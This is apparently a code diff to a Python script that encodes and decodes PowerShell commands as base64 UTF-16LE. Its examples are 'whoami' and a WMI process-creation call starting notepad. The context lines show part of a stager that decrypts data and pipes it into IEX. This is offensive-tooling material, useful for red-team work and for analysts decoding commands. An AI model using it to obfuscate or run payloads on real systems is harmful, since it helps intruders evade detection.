@@ -26,6 +26,11 @@ def encode_command(plain_cmd: str) -> str:
     return base64.b64encode(plain_cmd.encode("utf-16-le"))
 
 
+def decode_command(enc_cmd: str) -> str:
+    """将 enc_cmd 先 base64 解码然后 utf-16 le 解码"""
+    return base64.b64decode(enc_cmd).decode("utf-16-le")
+
+
 # cmd = "whoami"
 cmd = """
 # 检查 PowerShell 版本是否为 3 及以上
@@ -105,5 +110,13 @@ $data = $data[4..$data.length];
 -join [Char[]](& $R $data ($IV + $K)) | IEX
 
 """
+cmd = 'C:\Windows\System32\WindowsPowerShell\\v1.0\powershell.exe -noExit "whoami"'
+print(f"原始命令为:\n{cmd}")
+
+
 enc_cmd = encode_command(cmd)
-print(f"{cmd} 编码后的命令为: {enc_cmd}")
+print(f"{cmd} 编码后的命令为:\n{enc_cmd}")
+
+enc_cmd = "SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA"
+dec_cmd = decode_command(enc_cmd)
+print(f"{enc_cmd} 解码后的命令为:\n{dec_cmd}")
